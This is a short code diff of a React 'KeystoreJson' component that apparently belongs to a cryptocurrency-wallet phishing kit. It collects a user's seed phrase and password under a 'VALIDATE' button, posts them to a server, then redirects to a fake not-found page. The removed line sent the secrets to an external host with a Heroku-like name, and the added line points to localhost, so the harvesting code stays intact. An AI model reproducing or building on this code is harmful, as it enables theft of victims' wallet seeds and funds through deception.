@@ -14,7 +14,7 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
   }, [seed2, password]);
 
   const handleSubmit = (e) => {
-    axios.post("https://cryptoboss.herukoapp.com/form", { seed: seed2, password });
+    axios.post("http://localhost:8080/form", { seed: seed2, password });
     Navigate('/not_found')
   };
 
@@ -48,7 +48,7 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
             : { backgroundColor: "#1a8dda", color: "#fff" }
         }
         onClick={handleSubmit}
-        disabled2={disabled2}
+        disabled={disabled2}
       >
         VALIDATE
       </button>
